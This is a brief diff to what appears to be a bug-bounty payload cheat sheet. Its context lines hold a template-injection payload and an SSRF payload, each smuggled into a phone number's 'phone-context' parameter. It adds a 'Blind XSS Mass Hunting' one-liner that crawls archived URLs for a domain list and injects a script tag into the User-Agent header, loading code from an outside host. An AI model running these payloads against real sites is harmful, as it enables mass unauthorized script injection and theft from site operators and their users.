@@ -599,7 +599,9 @@ Template injection +441134960000;phone-context={{22}}[ [33]]{{77}}{% debug %} {7
 SSRF +441134960000;phone-context=http://burocoaborator.net
 
 
+𝘽𝙡𝙞𝙣𝙙 𝙓𝙎𝙎 𝙈𝙖𝙨𝙨 𝙃𝙪𝙣𝙩𝙞𝙣𝙜
 
+cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
 
 
 
